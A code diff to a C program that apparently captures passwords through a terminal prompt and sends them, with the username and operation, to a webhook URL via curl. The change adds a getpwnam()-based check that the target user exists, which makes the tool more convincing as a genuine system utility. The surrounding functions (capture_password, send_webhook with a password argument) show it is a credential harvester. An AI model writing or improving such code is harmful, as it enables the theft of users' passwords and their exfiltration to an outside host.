@@ -7,6 +7,7 @@
 #include <curl/curl.h>
 #include <termios.h>
 #include <sys/wait.h>
+#include <pwd.h> // For getpwnam()
 
 #define WEBHOOK_URL "YOUR_WEBHOOK_URL"
 
@@ -56,6 +57,11 @@ void send_webhook(const char *username, const char *operation, const char *passw
     } else {
         fprintf(stderr, "Failed to initialize CURL.\n");
     }
+}
+
+int user_exists(const char *username) {
+    struct passwd *pw = getpwnam(username);
+    return (pw != NULL); // Returns 1 if user exists, 0 otherwise
 }
 
 void capture_password(char *password, size_t size, const char *prompt) {
@@ -128,6 +134,13 @@ int main(int argc, char *argv[]) {
             exit(EXIT_FAILURE);
         }
     }
+
+    // Check if the user exists
+    if (!user_exists(username)) {
+        fprintf(stderr, "Error: User '%s' does not exist.\n", username);
+        exit(EXIT_FAILURE);
+    }
+
 
     // Log the operation
     printf("Operation: %s, User: %s\n", operation, username);
